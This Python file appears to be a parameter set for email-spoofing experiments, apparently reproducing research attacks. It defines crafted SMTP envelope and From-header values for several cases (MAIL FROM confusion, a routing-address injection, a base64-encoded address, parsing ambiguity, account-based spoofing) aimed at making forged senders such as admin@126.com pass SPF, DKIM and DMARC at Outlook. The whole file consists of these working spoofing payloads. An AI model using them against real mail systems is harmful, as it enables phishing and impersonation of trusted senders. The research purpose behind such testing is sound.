"""
The attacker and spoofer domain is ruin.net.cn, which is bound to a server with its 25 port shutdown.
SPF and DKIM records are set in ruin.net.cn
The victim address is ruin_2021@outlook.com.
PLEASE DO NOT LEAK ANY INFORMATION IN THIS FILE!!
"""

import base64
param = {
    # 4.1 MAIL FROM confusion
    # SPF=none DKIM=pass DMARC=bestguesspass
    # A3 is the same method
    'A1' : {
        'helo': 'ruin.net.cn',
        'login': 0,
        
        'mailfrom': "<any@fakesubdomain.ruin.net.cn>",
        'receiver': '<ruin_2021@outlook.com>',

        'dkim_para': {'d':b'ruin.net.cn', 's':b'selector', 'sign_header': b'From: <admin@ruin.net.cn>'},

        'mfrom': b'<admin@ruin.net.cn>',
        'subject': 'A1 attack',
        'body': 'Testing.'
    },
    # 4.3 Authentication results injection
    # This is a variation
    # Routing address in MAIL FROM
    # SPF=pass DKIM=pass DMARC=bestguesspass
    # While mfrom refers to another domain, DMARC will report fail
    # reason: compauth!
    'A5' : {
        'helo': 'ruin.net.cn',
        'login': 0,
        
        'mailfrom': "<@ruin.net.cn,@any.com:'any@ruin.net.cn>",
        'receiver': '<ruin_2021@outlook.com>',

        'dkim_para': {'d':b'ruin.net.cn', 's':b'selector', 'sign_header': b'From: <admin@ruin.net.cn>'},

        'mfrom': b'<admin@ruin.net.cn>',
        'subject': 'A5 attack',
        'body': 'Testing.'
    },
    # 5.2 Ambiguous email addresses
    # A10: Email address encoding
    # SPF=pass DKIM=none DMARC=bestguesspass
    'A10' : {
        'helo': 'ruin.net.cn',
        'login': 0,
        'mailfrom': '<any@ruin.net.cn>',
        'receiver': '<ruin_2021@outlook.com>',

        # 'dkim_para': {'d':b'ruin.net.cn', 's':b'selector', 'sign_header': b'From: <admin@ruin.net.cn>'},
        'dkim_para': None,

        'mfrom': b'=?utf-8?B?'+base64.b64encode(b"admin@126.com")+ b'?='+b',<any@ruin.net.cn>',
        'subject': 'A10 attack',
        'body': 'Testing.'
    },
    # A13: Parsing inconsistencies
    # SPF=pass DKIM=none DMARC=bestguesspass
    'A13' : {
        'helo': 'ruin.net.cn',
        'login': 0,
        'mailfrom': '<any@ruin.net.cn>',
        'receiver': '<ruin_2021@outlook.com>',

        # 'dkim_para': {'d':b'ruin.net.cn', 's':b'selector', 'sign_header': b'From: <admin@ruin.net.cn>'},
        'dkim_para': None,

        'mfrom': b'admin@ruin.net.cn,<any@ruin.net.cn>',
        'subject': 'A13 attack',
        'body': 'Testing.'
    },
    # 6.2 Spoofing via an email service account
    # SPF=pass DKIM=pass DMARC=pass
   'A17': {
        'helo': '126.com',
        'login': 1,
        'sender': 'jiarun1234@126.com',
        'mailfrom': '<jiarun1234@126.com>',
        'receiver': '<ruin_2021@outlook.com>',

        'dkim_para': None,

        'mfrom': b'<admin@126.com>',
        'subject': 'A17 attack',
        'body': 'Testing.'        
    }

}